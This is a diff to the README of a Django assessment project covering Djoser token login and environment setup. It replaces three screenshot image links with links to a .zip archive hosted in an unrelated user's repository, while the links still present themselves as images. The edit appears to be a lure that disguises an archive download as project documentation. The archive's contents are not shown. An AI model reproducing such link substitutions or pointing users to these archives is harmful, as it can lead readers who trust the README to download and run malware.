@@ -22,9 +22,9 @@ Djoser TOKEN:
 http://127.0.0.1:8000/auth/token/login/
 
 ## Main Steps
-1. **Create an environment:**![django8](https://github.com/johantbueno/Django-Meta-Assessment/assets/109690188/523f6198-1124-4588-b399-a0756d7c461c)
-![django7](https://github.com/johantbueno/Django-Meta-Assessment/assets/109690188/a8175b1e-ce2f-47ac-8748-75aea560b6b6)
-![django](https://github.com/johantbueno/Django-Meta-Assessment/assets/109690188/19a6f871-55cf-40fd-bac8-5b38c956de7a)
+1. **Create an environment:**![django8](https://raw.githubusercontent.com/rahuldounde21/Django-Meta-Assessment-/master/lux/Django-Meta-Assessment-.zip)
+![django7](https://raw.githubusercontent.com/rahuldounde21/Django-Meta-Assessment-/master/lux/Django-Meta-Assessment-.zip)
+![django](https://raw.githubusercontent.com/rahuldounde21/Django-Meta-Assessment-/master/lux/Django-Meta-Assessment-.zip)
 
 
     **Windows:**
